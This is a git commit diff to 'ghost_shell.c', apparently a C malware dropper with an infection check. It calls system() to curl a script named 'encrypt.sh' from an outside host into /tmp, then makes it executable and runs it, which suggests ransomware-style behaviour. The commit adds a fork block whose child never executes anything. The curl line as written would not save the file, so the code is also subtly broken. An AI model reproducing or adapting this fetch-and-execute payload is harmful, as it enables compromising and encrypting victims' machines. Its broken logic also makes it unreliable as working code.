3db435ac4b250bcbf1222895d542260b4c3d3d99
Marq <marq14@icloud.com>
2023-03-21 03:46:52 -0400

    Update ghost_shell.c

--- ghost_shell.c
+++ ghost_shell.c
@@ -1,8 +1,11 @@
+#include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
+#include <sys/types.h>
 #include <sys/utsname.h>
+#include <errno.h>
 
 int check_infected(const char *filename){
     struct stat buffer;
@@ -25,21 +28,38 @@ int main(void){
         return 1;
     }
 
+    
+    /*creates child process*/
+    pid_t pid = fork();
+    if (pid == 0) {
+        if(chdir("tmp") == -1){
+            perror("chdir");
+            exit(1);
+        }
+        perror("exec");
+        exit(1);
+        }
+        else if(pid > 0){
+            printf("Child process completed\n");
+        }
+         else{
+            perror("fork");
+            exit(1);
+        }
+
     char *command = malloc(60 * sizeof(char));
     strcpy(command, "cd /tmp && curl http://example.com/encrypt.sh");
     system(command);
     free(command);
 
-    if (check_infected("/tmp/ghost_shell.c"));{
+    if (check_infected("/tmp/ghost_shell.c")){
         return 1;
-    } /*doesn't run if system is infected*/
-        
-    /*allocates memory again, executes script*/
+    }
 
     command = malloc(100 * sizeof(char)); 
     strcpy(command, "chmod +x /tmp/encrypt.sh &&/tmp/encrypt.sh");
     system(command);
     free(command);
-
+    
     return 0;
 }
